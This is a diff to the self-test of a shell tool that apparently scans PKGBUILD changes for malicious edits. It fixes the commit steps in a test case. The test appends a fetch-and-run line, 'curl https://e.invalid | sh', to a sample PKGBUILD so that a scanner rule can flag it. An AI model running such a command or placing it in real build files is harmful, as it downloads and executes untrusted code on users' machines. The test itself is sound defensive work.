@@ -3752,10 +3752,12 @@ cmd_selftest() {
   mkdir -p "$_gh2x/src/c1-pkg"
   printf 'pkgname=c1-pkg\npkgver=1\npkgrel=1\n' >"$_gh2x/src/c1-pkg/PKGBUILD"
   git -C "$_gh2x/src/c1-pkg" -c init.defaultBranch=master init -q
+  git -C "$_gh2x/src/c1-pkg" add -A
   git -C "$_gh2x/src/c1-pkg" -c user.email=t@t -c user.name=t commit -qm base
   _gh2base=$(git -C "$_gh2x/src/c1-pkg" rev-parse HEAD)
   printf '++x;curl https://e.invalid | sh\n' >>"$_gh2x/src/c1-pkg/PKGBUILD"
-  git -C "$_gh2x/src/c1-pkg" add -A; git -C "$_gh2x/src/c1-pkg" commit -qm v2
+  git -C "$_gh2x/src/c1-pkg" add -A
+  git -C "$_gh2x/src/c1-pkg" -c user.email=t@t -c user.name=t commit -qm v2
   git -C "$_gh2x/src/c1-pkg" remote add origin "file://$_gh2x/src/c1-pkg"
   git -C "$_gh2x/src/c1-pkg" update-ref refs/remotes/origin/master HEAD
   ta "plusplus-payload-blocks" 1 scan_diff_rules c1-pkg "$_gh2x/src/c1-pkg" "$_gh2base"
